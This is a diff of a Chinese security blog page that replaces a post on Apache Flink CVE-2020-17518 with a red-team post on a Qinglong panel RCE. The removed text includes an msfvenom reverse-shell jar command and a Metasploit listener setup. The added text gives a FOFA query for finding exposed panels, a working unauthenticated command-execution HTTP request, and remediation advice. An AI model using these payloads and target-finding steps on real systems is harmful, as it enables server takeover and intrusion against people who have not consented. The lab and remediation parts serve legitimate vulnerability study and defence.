@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n">
-<title>【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="漏洞详情 1 青龙面板最新版本鉴权绕过导致远程代码执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。 鉴于该漏洞影响范围较大，建议尽快做好自查及防护。\nfofa语法 1 icon_hash==&#34;-254502902&#34; POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PUT /aPi/system/command-run HTTP/1.1 Host: xxxx:5700 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Content-Length: 23 Content-Type: application/json { &#34;command&#34;: &#34;ls&#34; } 利用成功证明：发送如上的http请求包，请求包中command参数设置为系统命令ls（Linux列出当前文件目录下文件的命令），发送并查看响应包，包中显示的当前服务器的文件目录，说明远程命令执行成功，漏洞存在。\n">
+<title>【红队】青龙面板远程RCE漏洞</title>
 
-<link rel='canonical' href='http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
+<link rel='canonical' href='http://localhost:1313/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【CVE-2020-17518】Apache Flink任意文件上传漏洞复现">
-<meta property='og:description' content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n">
-<meta property='og:url' content='http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
+<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【红队】青龙面板远程RCE漏洞">
+<meta property='og:description' content="漏洞详情 1 青龙面板最新版本鉴权绕过导致远程代码执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。 鉴于该漏洞影响范围较大，建议尽快做好自查及防护。\nfofa语法 1 icon_hash==&#34;-254502902&#34; POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PUT /aPi/system/command-run HTTP/1.1 Host: xxxx:5700 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Content-Length: 23 Content-Type: application/json { &#34;command&#34;: &#34;ls&#34; } 利用成功证明：发送如上的http请求包，请求包中command参数设置为系统命令ls（Linux列出当前文件目录下文件的命令），发送并查看响应包，包中显示的当前服务器的文件目录，说明远程命令执行成功，漏洞存在。\n">
+<meta property='og:url' content='http://localhost:1313/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='SlimerのBlog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/94.webp' />
-<meta name="twitter:title" content="【CVE-2020-17518】Apache Flink任意文件上传漏洞复现">
-<meta name="twitter:description" content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/94.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-02T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/120.webp' />
+<meta name="twitter:title" content="【红队】青龙面板远程RCE漏洞">
+<meta name="twitter:description" content="漏洞详情 1 青龙面板最新版本鉴权绕过导致远程代码执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。 鉴于该漏洞影响范围较大，建议尽快做好自查及防护。\nfofa语法 1 icon_hash==&#34;-254502902&#34; POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PUT /aPi/system/command-run HTTP/1.1 Host: xxxx:5700 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Content-Length: 23 Content-Type: application/json { &#34;command&#34;: &#34;ls&#34; } 利用成功证明：发送如上的http请求包，请求包中command参数设置为系统命令ls（Linux列出当前文件目录下文件的命令），发送并查看响应包，包中显示的当前服务器的文件目录，说明远程命令执行成功，漏洞存在。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/120.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,13 +232,10 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x00-漏洞描述">0x00 漏洞描述</a></li>
-    <li><a href="#0x01-影响范围">0x01 影响范围</a></li>
-    <li><a href="#0x02-环境搭建">0x02 环境搭建</a></li>
-    <li><a href="#0x03-漏洞复现">0x03 漏洞复现</a></li>
-    <li><a href="#0x04-漏洞利用">0x04 漏洞利用</a></li>
-    <li><a href="#0x05-漏洞检测">0x05 漏洞检测</a></li>
-    <li><a href="#0x06-漏洞修复">0x06 漏洞修复</a></li>
+    <li><a href="#漏洞详情">漏洞详情</a></li>
+    <li><a href="#fofa语法">fofa语法</a></li>
+    <li><a href="#poc">POC</a></li>
+    <li><a href="#修复建议">修复建议</a></li>
   </ul>
 </nav>
         </div>
@@ -253,9 +250,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+            <a href="/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/">
                 
-                    <img src="/images/94.webp" loading="lazy" alt="Featured image of post 【CVE-2020-17518】Apache Flink任意文件上传漏洞复现" />
+                    <img src="/images/120.webp" loading="lazy" alt="Featured image of post 【红队】青龙面板远程RCE漏洞" />
                 
             </a>
         </div>
@@ -264,10 +261,6 @@
     <div class="article-details">
     
     <header class="article-category">
-        
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #1d3557; color: #f1faee;">
-                渗透测试
-            </a>
         
             <a href="/categories/%E7%BA%A2%E9%98%9F/" style="background-color: #ff6b6b; color: #ffffff;">
                 红队
@@ -279,7 +272,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</a>
+            <a href="/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/">【红队】青龙面板远程RCE漏洞</a>
         </h2>
     
         
@@ -303,10 +296,10 @@
   <path d="M7 3v4" />
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
-</svg>2025年10月14日</time>
+</svg>2026年03月02日</time>
                 <span class="article-word-count">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
-                    文章共611字
+                    文章共585字
                 </span>
             </div>
 			
@@ -325,70 +318,26 @@
     <section class="article-content">
     
     
-    <h1 id="0x00-漏洞描述">0x00 漏洞描述</h1>
-<p>Apache <a href="https://so.csdn.net/so/search?q=Flink&amp;spm=1001.2101.3001.7020">Flink</a> 是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。<br>
-编号：CVE-2020-17518<br>
-Flink 1.5.1引入了REST API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。</p>
-<h1 id="0x01-影响范围">0x01 影响范围</h1>
-<p>Apache Flink 1.5.1 ~ 1.11.2</p>
-<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
-<p>启动vulhub_kali_linux<br>
-进入vulhub靶场已经给CVE-2020-17518搭建好的环境</p>
+    <h1 id="漏洞详情">漏洞详情</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd vulhub/flink/CVE-2020-17518
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">青龙面板最新版本鉴权绕过导致远程代码执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>使用docker启动flink环境</p>
+</div><p><strong>鉴于该漏洞影响范围较大，建议尽快做好自查及防护。</strong></p>
+<h1 id="fofa语法">fofa语法</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker-compose up -d
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">icon_hash==&#34;-254502902&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>环境启动后,本机访问</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.137:8081
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162842.png" alt="image.png"></p>
-<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
-<p>上传任意文件,进行bp抓包<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162952.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163008.png" alt="image.png"><br>
-在filename字段值修改为jar后缀名 ,发送请求,回显的状态码200以及参数说明上传成功<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163049.png" alt="image.png"><br>
-回显的信息发现上传文件的位置:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flink</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">fc404e92</span><span class="o">-</span><span class="n">f1db</span><span class="o">-</span><span class="mi">4258</span><span class="o">-</span><span class="mf">923e-10</span><span class="n">f2199225eb</span><span class="o">/</span><span class="n">flink</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">upload</span><span class="o">/</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="0x04-漏洞利用">0x04 漏洞利用</h1>
-<p>使用kali的msfvenom工具,生成文件的目录自定义<br>
-lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为文件路径以及文件名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp lhost=192.168.197.129 lport=1314 -f jar &gt;/home/slimer/桌面/2.jar
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164618.png" alt="image.png"><br>
-启动msf监听</p>
+</div><h1 id="poc">POC</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -402,40 +351,34 @@ lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为�
 </span><span class="lnt"> 9
 </span><span class="lnt">10
 </span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfconsole</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听模块</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置</span><span class="w"> </span><span class="n">payload</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">java</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">地址</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">197</span><span class="p">.</span><span class="na">129</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听端口</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="n">1314</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">执行</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">run</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165222.png" alt="image.png"><br>
-上传<code>2.jar</code>文件<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165011.png" alt="image.png"><br>
-成功监听：<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164932.png" alt="image.png"></p>
-<h1 id="0x05-漏洞检测">0x05 漏洞检测</h1>
-<p>可以通过分析apache日志来检测攻击。</p>
-<h1 id="0x06-漏洞修复">0x06 漏洞修复</h1>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">官方已发布安全版本，请及时下载升级至安全版本。</span>
-</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">flink</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">zh</span><span class="o">/</span><span class="n">downloads</span><span class="o">.</span><span class="n">html</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PUT /aPi/system/command-run HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: xxxx:5700
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+</span></span><span class="line"><span class="cl">Accept: application/json, text/plain, */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-Length: 23
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &#34;command&#34;: &#34;ls&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
 </span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div><p>利用成功证明：发送如上的http请求包，请求包中command参数设置为系统命令ls（Linux列出当前文件目录下文件的命令），发送并查看响应包，包中显示的当前服务器的文件目录，说明远程命令执行成功，漏洞存在。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302123304.png" alt="image.png"></p>
+<h1 id="修复建议">修复建议</h1>
+<p>针对已安装青龙面板的用户，官方给出了明确的应急处置方案。第一步是自查风险，通过SSH方式登录NAS，检查路径/ql/data/db/下是否存在陌生的.fullgc恶意文件，同时使用top命令观察系统进程，排查是否有CPU、内存异常高占用的未知进程。这一步就像是给设备做一次全面的体检，及时发现潜在的问题。如果发现了恶意文件或异常进程，用户需要立即停止青龙容器及相关服务，并彻底删除恶意文件，避免其持续破坏设备。关闭公网映射也是非常重要的一步，若此前已将5700/15700端口映射到公网，务必立即关闭，杜绝不法分子通过漏洞远程攻击的可能。在开发者未发布官方安全修复版本并经厂商验证前，建议直接停用青龙面板，切勿抱有侥幸心理继续使用。</p>
+
 </section>
 
 
@@ -459,63 +402,6 @@ lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为�
             
                 
 <article class="has-image">
-    <a href="/p/pocapache-struts-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2025-68493/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/115.webp" loading="lazy" data-key="" data-hash="/images/115.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【POC】Apache Struts XML外部实体注入漏洞(CVE-2025-68493)</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/82.webp" loading="lazy" data-key="" data-hash="/images/82.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【资产收集】ENScan_Go-信息收集工具</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/120.webp" loading="lazy" data-key="" data-hash="/images/120.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【红队】青龙面板远程RCE漏洞</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
     <a href="/p/poccve-2026-24061-telnet%E8%BF%9C%E7%A8%8B%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/">
         
         
@@ -535,18 +421,75 @@ lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为�
             
                 
 <article class="has-image">
-    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BC%9A%E8%AF%9D%E5%A4%8D%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+    <a href="/p/pocapache-struts-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2025-68493/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/112.webp" loading="lazy" data-key="" data-hash="/images/112.webp"/>
+                    <img src="/images/115.webp" loading="lazy" data-key="" data-hash="/images/115.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【渗透测试】会话复用漏洞</h2>
+            <h2 class="article-title">【POC】Apache Struts XML外部实体注入漏洞(CVE-2025-68493)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/95.webp" loading="lazy" data-key="" data-hash="/images/95.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【Minio】云存储服务接口攻击技巧</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/94.webp" loading="lazy" data-key="" data-hash="/images/94.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/91.webp" loading="lazy" data-key="" data-hash="/images/91.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【CVE-2025-32463】Linux sudo chroot 本地提权</h2>
         </div>
     </a>
 </article>
